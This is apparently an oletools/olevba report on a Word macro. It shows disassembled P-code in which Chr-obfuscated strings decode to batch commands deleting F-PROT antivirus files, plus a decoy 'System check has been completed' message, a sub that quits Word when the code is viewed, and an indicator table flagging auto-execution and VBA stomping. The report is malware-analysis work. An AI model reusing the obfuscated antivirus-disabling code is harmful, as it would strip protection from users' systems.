' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UU$ 
' Line #115:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VV$ 
' Line #116:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	Ld QQ$ 
' 	Concat 
' 	Ld SS$ 
' 	Concat 
' 	Ld TT$ 
' 	Concat 
' 	Ld UU$ 
' 	Concat 
' 	Ld VV$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #118:
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #119:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld OO$ 
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OO$ 
' Line #123:
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PP$ 
' Line #124:
' 	Ld OO$ 
' 	Ld PP$ 
' 	Concat 
' 	St YY$ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld YY$ 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #125:
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' 	FuncDefn (Sub ViewVBCode())
' Line #129:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	ArgsMemCall Quit 0x0001 
' Line #130:
' 	EndSub 
' Line #131:
' Line #132:
' 	QuoteRem 0x0000 0x0061 "*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*"
' Line #133:
' 	QuoteRem 0x0000 0x0061 "$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$"
' Line #134:
' 	QuoteRem 0x0000 0x0061 "*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*"
' Line #135:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

